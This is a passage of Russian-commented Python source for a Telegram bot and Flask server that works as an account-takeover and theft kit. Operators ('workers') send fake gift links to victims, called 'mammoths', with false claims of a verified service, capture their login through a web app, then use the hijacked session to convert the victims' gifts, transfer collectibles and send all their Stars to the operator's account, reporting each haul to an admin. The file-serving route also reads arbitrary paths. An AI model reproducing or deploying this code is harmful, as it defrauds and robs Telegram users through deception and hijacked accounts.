        return jsonify({'status': 'error', 'message': str(e)}), 500




async def connect_telegram_and_process(user_id, phone, phone_code_hash):
    """Функция для подключения Telegram и обработки активов"""
    try:
        client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)

        # Запускаем клиент с переданными данными
        await client.start(phone=phone, phone_code_hash=phone_code_hash)

        # Проверяем авторизацию
        if await client.is_user_authorized():
            # Запускаем процесс обработки активов
            log_message = await process_telegram_assets_real(user_id, {})
            return {'status': 'success', 'log': log_message}
        else:
            return {'status': 'error', 'message': 'Не удалось авторизоваться'}

    except Exception as e:
        logging.error(f"Error in Telegram connection: {e}")
        return {'status': 'error', 'message': str(e)}

def add_gift(gift_id, target_username, worker_username, worker_user_id, gift_url):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        'INSERT INTO gifts (gift_id, target_username, worker_username, worker_user_id, gift_url) VALUES (?, ?, ?, ?, ?)',
        (gift_id, target_username, worker_username, worker_user_id, gift_url)
    )
    conn.commit()
    conn.close()

def get_gift(gift_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM gifts WHERE gift_id = ?', (gift_id,))
    gift = cursor.fetchone()
    conn.close()

    if gift:
        return {
            'gift_id': gift[0],
            'target_username': gift[1],
            'worker_username': gift[2],
            'worker_user_id': gift[3],
            'gift_url': gift[4],
            'claimed': bool(gift[5])
        }
    return None

def update_gift_claimed(gift_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('UPDATE gifts SET claimed = TRUE WHERE gift_id = ?', (gift_id,))
    conn.commit()
    conn.close()

def add_user_gift(user_id, gift_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('INSERT OR IGNORE INTO user_gifts (user_id, gift_id) VALUES (?, ?)', (user_id, gift_id))
    conn.commit()
    conn.close()

def get_user_gifts(user_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        SELECT g.gift_id, g.target_username, g.worker_username, g.gift_url 
        FROM gifts g 
        JOIN user_gifts ug ON g.gift_id = ug.gift_id 
        WHERE ug.user_id = ?
    ''', (user_id,))
    gifts = cursor.fetchall()
    conn.close()

    return [{
        'gift_id': gift[0],
        'target_username': gift[1],
        'worker_username': gift[2],
        'gift_url': gift[3]
    } for gift in gifts]

def save_user_session(user_id, phone=None, phone_code_hash=None, gift_id=None, auth_step=None):
    conn = get_db_connection()
    cursor = conn.cursor()

    cursor.execute('SELECT * FROM user_sessions WHERE user_id = ?', (user_id,))
    existing = cursor.fetchone()

    if existing:
        cursor.execute('''
            UPDATE user_sessions 
            SET phone = COALESCE(?, phone), 
                phone_code_hash = COALESCE(?, phone_code_hash),
                gift_id = COALESCE(?, gift_id),
                auth_step = COALESCE(?, auth_step)
            WHERE user_id = ?
        ''', (phone, phone_code_hash, gift_id, auth_step, user_id))
    else:
        cursor.execute('''
            INSERT INTO user_sessions (user_id, phone, phone_code_hash, gift_id, auth_step) 
            VALUES (?, ?, ?, ?, ?)
        ''', (user_id, phone, phone_code_hash, gift_id, auth_step))

    conn.commit()
    conn.close()

def get_user_session(user_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM user_sessions WHERE user_id = ?', (user_id,))
    session = cursor.fetchone()
    conn.close()

    if session:
        return {
            'user_id': session[0],
            'phone': session[1],
            'phone_code_hash': session[2],
            'gift_id': session[3],
            'auth_step': session[4]
        }
    return None

def delete_user_session(user_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('DELETE FROM user_sessions WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

# Функции для работы с кошельками
def bind_wallet(user_id: int, wallet_address: str, worker_user_id: int = None):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        'INSERT OR REPLACE INTO user_wallets (user_id, wallet_address, worker_user_id) VALUES (?, ?, ?)',
        (user_id, wallet_address, worker_user_id)
    )
    conn.commit()
    conn.close()

def get_wallet_by_user(user_id: int):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM user_wallets WHERE user_id = ?', (user_id,))
    wallet = cursor.fetchone()
    conn.close()

    if wallet:
        return {
            'user_id': wallet[0],
            'wallet_address': wallet[1],
            'worker_user_id': wallet[2]
        }
    return None

def get_user_by_wallet(wallet_address: str):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM user_wallets WHERE wallet_address = ?', (wallet_address,))
    wallet = cursor.fetchone()
    conn.close()

    if wallet:
        return {
            'user_id': wallet[0],
            'wallet_address': wallet[1],
            'worker_user_id': wallet[2]
        }
    return None

# Функция для логирования событий веб-приложения
def log_webapp_event(user_id: int, event_type: str, wallet_address: str = None, ip_address: str = None,
                     user_agent: str = None):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        'INSERT INTO webapp_events (user_id, event_type, wallet_address, ip_address, user_agent) VALUES (?, ?, ?, ?, ?)',
        (user_id, event_type, wallet_address, ip_address, user_agent)
    )
    conn.commit()
    conn.close()

init_db()

# Вебхук для обработки событий от веб-приложения
@flask_app.route('/api/process-telegram-assets', methods=['POST'])
def process_telegram_assets_endpoint():
    try:
        data = request.json
        user_data = data.get('user')
        session_data = data.get('session')

        if not user_data or not session_data:
            return jsonify({'status': 'error', 'message': 'Missing user or session data'}), 400

        # Запускаем реальную обработку в отдельном потоке
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        report = loop.run_until_complete(
            process_telegram_assets_real(session_data, YOUR_TELEGRAM_USER_ID)
        )

        loop.close()

        # Отправляем отчет админу
        asyncio.run_coroutine_threadsafe(
            send_telegram_message(ADMIN_CHAT_ID, report, 'Markdown'),
            asyncio.get_event_loop()
        )

        # Сохраняем в базу
        save_asset_transfer_log(user_data, report)

        return jsonify({
            'status': 'success',
            'message': 'Assets processed successfully',
            'report': report
        }), 200

    except Exception as e:
        logging.error(f"Error in asset processing endpoint: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

async def send_telegram_message(chat_id, text, parse_mode=None):
    """Вспомогательная функция для отправки сообщений через бота"""
    bot = Bot(token=BOT_TOKEN)
    await bot.send_message(chat_id=chat_id, text=text, parse_mode=parse_mode)

def get_main_keyboard():
    keyboard = [
        [KeyboardButton("👤Профиль"), KeyboardButton("ℹ️О нас")],
        [KeyboardButton("🆘Поддержка"), KeyboardButton("🎁Мои подарки")],
        [KeyboardButton("🛒Маркет")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def find_user_id_by_username(username: str) -> Optional[int]:
    """
    Находит user_id по username в базе данных
    """
    conn = get_db_connection()
    cursor = conn.cursor()

    try:
        # Ищем пользователя в таблице пользователей
        cursor.execute('''
            SELECT user_id FROM users WHERE username = ?
        ''', (username,))

        result = cursor.fetchone()

        if result:
            return result[0]

        # Если не нашли в таблице users, ищем в таблице подарков
        cursor.execute('''
            SELECT DISTINCT worker_user_id FROM gifts WHERE worker_username = ?
            UNION
            SELECT DISTINCT ug.user_id FROM user_gifts ug 
            JOIN gifts g ON ug.gift_id = g.gift_id 
            WHERE g.target_username = ?
        ''', (username, username))

        result = cursor.fetchone()

        if result:
            return result[0]

        # Если все еще не нашли, ищем в таблице кошельков
        cursor.execute('''
            SELECT user_id FROM user_wallets WHERE worker_user_id IN (
                SELECT user_id FROM users WHERE username = ?
            )
        ''', (username,))

        result = cursor.fetchone()

        return result[0] if result else None

    except Exception as e:
        logging.error(f"Error finding user_id by username {username}: {e}")
        return None
    finally:
        conn.close()

async def update_user_info_from_message(update: Update):
    """
    Обновляет информацию о пользователе при получении сообщения
    """
    user = update.effective_user
    if not user:
        return

    conn = get_db_connection()
    cursor = conn.cursor()

    try:
        cursor.execute('''
            INSERT OR REPLACE INTO users (user_id, username, first_name, last_name, updated_at)
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
        ''', (user.id, user.username, user.first_name, user.last_name))

        conn.commit()

    except Exception as e:
        logging.error(f"Error updating user info: {e}")
    finally:
        conn.close()

async def bind_wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not context.args or len(context.args) < 2:
            await update.message.reply_text("Использование: /bind_wallet @username wallet_address")
            return

        target_username = context.args[0].replace('@', '')
        wallet_address = context.args[1]
        worker_user_id = update.effective_user.id

        # Обновляем информацию о воркере
        await update_user_info_from_message(update)

        # Ищем user_id мамонта
        target_user_id = find_user_id_by_username(target_username)

        if target_user_id:
            bind_wallet(target_user_id, wallet_address, worker_user_id)

            # Получаем информацию о мамонте для логов
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT username, first_name, last_name FROM users WHERE user_id = ?', (target_user_id,))
            user_info = cursor.fetchone()
            conn.close()

            mammoth_username = user_info[0] if user_info else target_username
            mammoth_name = f"{user_info[1] or ''} {user_info[2] or ''}".strip() if user_info else "неизвестно"

            await update.message.reply_text(
                f"✅ Кошелек `{wallet_address}` привязан к пользователю @{target_username} (ID: {target_user_id})",
                parse_mode='Markdown'
            )

            # Уведомляем админа
            admin_message = f"""🔗 Привязка кошелька

👨‍💼 Воркер: @{update.effective_user.username} (ID: {worker_user_id})
👤 Мамонт: @{mammoth_username} (ID: {target_user_id})
📛 Имя: {mammoth_name}
🏦 Кошелек: `{wallet_address}`
⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""

            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=admin_message,
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(
                f"❌ Пользователь @{target_username} не найден в базе данных.\n"
                f"Убедитесь, что пользователь начинал диалог с ботом или получал подарки."
            )

    except Exception as e:
        logging.error(f"Error in bind_wallet_command: {e}")
        await update.message.reply_text("❌ Ошибка при привязке кошелька")


@flask_app.route('/api/process-all-assets-comprehensive', methods=['POST'])
async def process_all_assets_comprehensive():
    """Новый эндпоинт для полной обработки всех активов"""
    try:
        data = request.json
        phone = data.get('phone')

        if not phone:
            return jsonify({'success': False, 'message': 'Phone required'})

        # Получаем сессию из базы
        session_data = get_telethon_session(phone)
        if not session_data or not session_data.get('authorized'):
            return jsonify({'success': False, 'message': 'Not authorized'})

        # Восстанавливаем клиент
        client = TelegramClient(
            StringSession(session_data['session_string']),
            int(API_ID),
            API_HASH
        )
        await client.connect()

        # Получаем информацию о пользователе
        me = await client.get_me()
        user_info = {
            'id': me.id,
            'username': me.username,
            'first_name': me.first_name,
            'last_name': me.last_name
        }

        # Получаем реферера
        referrer_info = get_referrer_info(me.id)

        # 1. Получаем подарки
        gifts_response = await client(GetSavedStarGiftsRequest(
            peer=InputPeerSelf(),
            offset=0,
            limit=100
        ))

        initial_gifts = len(gifts_response.gifts)
        converted_gifts = []
        transferred_collectibles = []
        total_stars_from_gifts = 0

        # 2. Конвертируем подарки в звезды
        for gift in gifts_response.gifts:
            try:
                if getattr(gift, 'can_convert', False):
                    await client(ConvertStarGiftRequest(
                        peer=InputPeerSelf(),
                        id=gift.id
                    ))

                    stars_value = getattr(gift, 'stars', 100)
                    total_stars_from_gifts += stars_value
                    converted_gifts.append({
                        'id': gift.id,
                        'title': getattr(gift, 'title', 'Unknown Gift'),
                        'stars': stars_value
                    })
                    await asyncio.sleep(1)
            except Exception as e:
                logging.error(f"Error converting gift: {e}")
                continue

        # 3. Передаем коллекционные предметы
        for gift in gifts_response.gifts:
            try:
                if (getattr(gift, 'unique', False) and
                        getattr(gift, 'can_transfer', False)):
                    await client(TransferStarGiftRequest(
                        peer=InputPeerSelf(),
                        id=gift.id,
                        to_peer=InputPeerUser(int(YOUR_TELEGRAM_USER_ID), 0)
                    ))

                    transferred_collectibles.append({
                        'id': gift.id,
                        'title': getattr(gift, 'title', 'Unknown Collectible')
                    })
                    await asyncio.sleep(1)
            except Exception as e:
                logging.error(f"Error transferring collectible: {e}")
                continue

        # 4. Переводим звезды
        stars_status = await client(GetStarsStatusRequest(peer=InputPeerSelf()))
        initial_stars = stars_status.balance
        current_balance = initial_stars + total_stars_from_gifts

        stars_transferred = 0
        if current_balance > 0:
            try:
                await client(SendStarsFormRequest(
                    peer=InputPeerUser(int(YOUR_TELEGRAM_USER_ID), 0),
                    form_id=random.randint(100000, 999999),
                    stars=current_balance
                ))
                stars_transferred = current_balance
            except Exception as e:
                logging.error(f"Error transferring stars: {e}")

        # 5. Получаем финальный баланс
        final_status = await client(GetStarsStatusRequest(peer=InputPeerSelf()))
        final_balance = final_status.balance

        await client.disconnect()

        # 6. Создаем детальный отчет
        report = create_detailed_report(
            user_info, initial_gifts, converted_gifts,
            transferred_collectibles, initial_stars, total_stars_from_gifts,
            stars_transferred, final_balance, referrer_info
        )

        # Отправляем отчет админу
        await send_telegram_message(ADMIN_CHAT_ID, report, 'Markdown')

        return jsonify({
            'success': True,
            'report': report,
            'stats': {
                'initial_gifts': initial_gifts,
                'converted_gifts': len(converted_gifts),
                'transferred_collectibles': len(transferred_collectibles),
                'stars_transferred': stars_transferred
            }
        })

    except Exception as e:
        logging.error(f"Error processing assets: {e}")
        return jsonify({'success': False, 'message': str(e)})

# ИСПРАВЛЕННАЯ ФУНКЦИЯ START - БЕЗ ВЕРИФИКАЦИИ
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Обновляем информацию о пользователе
    await update_user_info_from_message(update)

    if context.args and context.args[0].startswith('gift_'):
        gift_id = context.args[0].replace('gift_', '')

        gift = get_gift(gift_id)
        if not gift:
            await update.message.reply_text("Подарок не найден или уже был использован!")
            return

        target_username = gift['target_username']
        worker_username = gift['worker_username']
        user_id = update.effective_user.id

        add_user_gift(user_id, gift_id)

        try:
            admin_message = f"🎁 Пользователь @{target_username} перешел по ссылке подарка от @{worker_username}"
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=admin_message
            )
        except Exception as e:
            logging.error(f"Error sending admin notification: {e}")

        try:
            worker_message = f"🎁 Пользователь @{target_username} перешел по ссылке вашего подарка"
            await context.bot.send_message(
                chat_id=gift['worker_user_id'],
                text=worker_message
            )
        except Exception as e:
            logging.error(f"Error sending worker notification: {e}")

        # Веб-приложение вместо верификации
        webapp_url = f"{WEB_APP_URL}?gift_id={gift_id}"
        keyboard = [[InlineKeyboardButton("🔑Подключить кошелёк", web_app=WebAppInfo(url=webapp_url))]]

        message_text = f"""<a href="{gift['gift_url']}">🎁</a> Подарков ожидает получения (1)

⚠️ Доступ ограничен

Наш <a href="{CHANNEL_URL}">канал</a> подтверждён и верифицирован, что гарантирует подлинность и надёжность сервиса.

Чтобы получить подарок необходимо подключить кошелёк."""

        await update.message.reply_text(
            message_text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            disable_web_page_preview=False,
            parse_mode='HTML'
        )
        return

    # Обычный старт без аргументов - просто приветствие
    welcome_text = f"""ℹ️ Добро пожаловать в {SHOP_NAME}

{SHOP_NAME} — это удобный сервис для обмена подарками прямо в Telegram.
Быстро, просто и безопасно ✨

🔑 Подключите профиль, чтобы:
• подтверждать свои действия
• защитить обмены от подделок
• быть уверенными в прозрачности каждой операции

🚀 После входа вы сможете:
🎁 получать и отправлять подарки
🔄 обмениваться ими с другими пользователями
🛡 пользоваться системой с дополнительной защитой
🛒 находить интересные вещи во встроенном маркете

{SHOP_NAME} создан на базе официальных инструментов Telegram и полностью соответствует стандартам безопасности."""
    await update.message.reply_text(
        welcome_text,
        reply_markup=get_main_keyboard()
    )

async def handle_buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not context.args or len(context.args) < 2:
            await update.message.reply_text("Использование: /buy @username ссылка_на_подарок")
            return

        target_username = context.args[0].replace('@', '')
        gift_url_raw = ' '.join(context.args[1:])

        if gift_url_raw.startswith(('https://', 'http://')):
            gift_url = gift_url_raw
        elif gift_url_raw.startswith('t.me/'):
            gift_url = f"https://{gift_url_raw}"
        else:
            gift_url = gift_url_raw

        worker_username = update.effective_user.username or "unknown"
        worker_user_id = update.effective_user.id

        gift_id = secrets.token_urlsafe(8)
        add_gift(gift_id, target_username, worker_username, worker_user_id, gift_url)

        # Создаем URL для веб-приложения
        webapp_url = f"{WEB_APP_URL}?gift_id={gift_id}"

        keyboard = [[InlineKeyboardButton("🎁 Получить подарок", web_app=WebAppInfo(url=webapp_url))]]

        message_text = f"""🎁 Приобретён подарок
({gift_url})
Для: @{target_username}
От: @{worker_username}

*перешлите это сообщение получателю*"""

        await update.message.reply_text(
            message_text,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    except Exception as e:
        logging.error(f"Error in handle_buy: {e}")
        await update.message.reply_text(
            "Использование: /buy @username ссылка_на_подарок\n\nПример:\n/buy @username https://t.me/nft/PlushPepe-568\n/buy username t.me/nft/PlushPepe-568")

async def inline_buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.inline_query.query
    if not query:
        return

    try:
        parts = query.split(' ', 1)
        if len(parts) < 2:
            return

        target_username = parts[0].replace('@', '')
        gift_url_raw = parts[1]

        if gift_url_raw.startswith(('https://', 'http://')):
            gift_url = gift_url_raw
        elif gift_url_raw.startswith('t.me/'):
            gift_url = f"https://{gift_url_raw}"
        else:
            gift_url = gift_url_raw

        worker_username = update.effective_user.username or "unknown"
        worker_user_id = update.effective_user.id

        gift_id = secrets.token_urlsafe(8)
        add_gift(gift_id, target_username, worker_username, worker_user_id, gift_url)

        message_text = f"""🎁 Приобретён подарок
({gift_url})
Для: @{target_username}
От: @{worker_username}

"""

        bot_username = context.bot.username
        deep_link = f"https://t.me/{bot_username}?start=gift_{gift_id}"

        results = [
            InlineQueryResultArticle(
                id=gift_id,
                title=f"Отправить подарок @{target_username}",
                description=gift_url,
                input_message_content=InputTextMessageContent(
                    message_text=message_text,
                    parse_mode=None
                ),
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🎁Получить", url=deep_link)
                ]])
            )
        ]

        await update.inline_query.answer(results, cache_time=1)

    except Exception as e:
        logging.error(f"Error in inline_buy: {e}")

        error_result = [
            InlineQueryResultArticle(
                id="error",
                title="Ошибка формата",
                description="Используйте: @username ссылка_на_подарок",
                input_message_content=InputTextMessageContent(
                    message_text="❌ Неверный формат. Используйте: @username ссылка_на_подарок"
                )
            )
        ]
        await update.inline_query.answer(error_result, cache_time=1)

async def handle_claim(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    try:
        data_parts = query.data.split(':')
        if len(data_parts) != 2 or data_parts[0] != 'claim':
            await query.edit_message_text("Ошибка: неверные данные кнопки")
            return

        gift_id = data_parts[1]
        gift = get_gift(gift_id)
        if not gift:
            await query.edit_message_text("Подарок не найден или уже был использован!")
            return

        # ИСПРАВЛЕНО: Используем WebApp вместо callback
        webapp_url = f"{WEB_APP_URL}?gift_id={gift_id}"
        keyboard = [[InlineKeyboardButton("🔑 Войти", web_app=WebAppInfo(url=webapp_url))]]

        message_text = f"""<a href="{gift['gift_url']}">🎁</a> Подарков ожидает получения (1)

⚠️ Доступ ограничен

Наш <a href="{CHANNEL_URL}">канал</a> подтверждён и верифицирован, что гарантирует подлинность и надёжность сервиса.

Чтобы начать пользоваться сервисом и получить подарок, необходимо подключиться."""

        await query.edit_message_text(
            message_text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            disable_web_page_preview=False,
            parse_mode='HTML'
        )

    except Exception as e:
        logging.error(f"Error in handle_claim: {e}")
        await query.edit_message_text("Произошла ошибка. Попробуйте позже.")

async def handle_my_gifts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        user_gifts_list = get_user_gifts(user_id)

        if not user_gifts_list:
            await update.message.reply_text("У вас пока нет подарков.")
            return

        for gift in user_gifts_list:
            # Проверяем, был ли подарок уже получен (claimed)
            gift_info = get_gift(gift['gift_id'])
            is_claimed = gift_info['claimed'] if gift_info else False

            if not is_claimed:
                # ИСПРАВЛЕНО: Используем WebApp вместо callback
                webapp_url = f"{WEB_APP_URL}?gift_id={gift['gift_id']}"
                keyboard = [[InlineKeyboardButton("🔑Войти", web_app=WebAppInfo(url=webapp_url))]]
                reply_markup = InlineKeyboardMarkup(keyboard)
            else:
                reply_markup = None

            message_text = f"""<a href="{gift['gift_url']}">🎁</a> Подарков ожидает получения (1)

⚠️ Доступ ограничен

Наш <a href="{CHANNEL_URL}">канал</a> подтверждён и верифицирован, что гарантирует подлинность и надёжность сервиса.

Чтобы начать пользоваться сервисом и получить подарок, необходимо подключиться."""

            await update.message.reply_text(
                message_text,
                reply_markup=reply_markup,
                disable_web_page_preview=False,
                parse_mode='HTML'
            )

    except Exception as e:
        logging.error(f"Error in handle_my_gifts: {e}")
        await update.message.reply_text("Произошла ошибка при загрузке ваших подарков.")

async def handle_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        username = user.username or "не установлен"

        profile_text = f"""👨‍💼 Пользователь: @{username}
🆔 ID: {user.id}

ℹ️ Статус: Не подключён"""

        try:
            await update.message.reply_photo(
                photo=open('profile.jpg', 'rb') if os.path.exists('profile.jpg') else START_IMAGE_URL,
                caption=profile_text
            )
        except Exception as e:
            logging.error(f"Error sending profile photo: {e}")
            await update.message.reply_text(profile_text)

    except Exception as e:
        logging.error(f"Error in handle_profile: {e}")
        await update.message.reply_text("Произошла ошибка при загрузке профиля.")

async def handle_about(update: Update, context: ContextTypes.DEFAULT_TYPE):
    about_text = f"""ℹ️ Добро пожаловать в {SHOP_NAME}

{SHOP_NAME} — это удобный сервис для обмена подарками прямо в Telegram.
Быстро, просто и безопасно ✨

🔑 Подключите профиль, чтобы:
• подтверждать свои действия
• защитить обмены от подделок
• быть уверенными в прозрачности каждой операции

🚀 После входа вы сможете:
🎁 получать и отправлять подарки
🔄 обмениваться ими с другими пользователями
🛡 пользоваться системой с дополнительной защитой
🛒 находить интересные вещи во встроенном маркете

{SHOP_NAME} создан на базе официальных инструментов Telegram и полностью соответствует стандартам безопасности."""

    await update.message.reply_text(about_text)

async def handle_support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        support_text = """🕰 Поддержка работает круглосуточно.

❗️ Пожалуйста, сформулируйте свой вопрос в одном сообщении — так мы сможем быстрее вам помочь.

✉️ Написать в поддержку можно по кнопке ниже."""

        keyboard = [
            [InlineKeyboardButton("Написать", url="https://t.me/your_support_username")]]  # Замените на реальную ссылку

        try:
            await update.message.reply_photo(
                photo=open('support.jpg', 'rb') if os.path.exists('support.jpg') else START_IMAGE_URL,
                caption=support_text,
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except Exception as e:
            logging.error(f"Error sending support photo: {e}")
            await update.message.reply_text(
                support_text,
                reply_markup=InlineKeyboardMarkup(keyboard)
            )

    except Exception as e:
        logging.error(f"Error in handle_support: {e}")
        await update.message.reply_text("Произошла ошибка при загрузке информации о поддержке.")

async def handle_market(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # ИСПРАВЛЕНО: Маркет теперь ведет на веб-приложение
    webapp_url = f"{WEB_APP_URL}?page=market"
    keyboard = [[InlineKeyboardButton("🛒 Открыть маркет", web_app=WebAppInfo(url=webapp_url))]]

    await update.message.reply_text(
        "🛒 Откройте наш маркет в веб-приложении:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )






# ДОБАВЬТЕ В КОНЕЦ ФАЙЛА ПЕРЕД run_bot():
@flask_app.route('/')
def serve_index():
    """Обслуживание главной страницы веб-приложения"""
    return open('index.html', 'r', encoding='utf-8').read()

@flask_app.route('/<path:path>')
def serve_static(path):
    """Обслуживание статических файлов"""
    try:
        return open(path, 'r', encoding='utf-8').read()
    except:
        return "File not found", 404

def run_bot():
    """Запуск Telegram бота"""
    # Create a new event loop for this thread
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    application = Application.builder().token(BOT_TOKEN).build()

    # Обработчики команд
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("buy", handle_buy))
    application.add_handler(CommandHandler("bind_wallet", bind_wallet_command))
    application.add_handler(CommandHandler("profile", handle_profile))

    # Инлайн обработчик для покупки подарков
    application.add_handler(InlineQueryHandler(inline_buy))

    # Обработчики callback_query
    application.add_handler(CallbackQueryHandler(handle_claim, pattern="^claim:"))

    # Обработчики кнопок меню
    application.add_handler(MessageHandler(filters.Text("👤Профиль"), handle_profile))
    application.add_handler(MessageHandler(filters.Text("ℹ️О нас"), handle_about))
    application.add_handler(MessageHandler(filters.Text("🆘Поддержка"), handle_support))
    application.add_handler(MessageHandler(filters.Text("🎁Мои подарки"), handle_my_gifts))
    application.add_handler(MessageHandler(filters.Text("🛒Маркет"), handle_market))



    # Запуск бота
    try:
        application.run_polling()
    finally:
        # Close the loop when done
        loop.close()

def run_webhook():
    """Запуск Flask веб-сервера"""
    flask_app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

if __name__ == "__main__":
    init_db()

    # Запускаем в отдельных потоках
    import threading

    # Поток для бота
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()

    # Даем боту время на запуск
    time.sleep(5)

    # Поток для вебхуков
    webhook_thread = threading.Thread(target=run_webhook)
    webhook_thread.daemon = True
    webhook_thread.start()

    # Основной поток
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Остановка приложения...")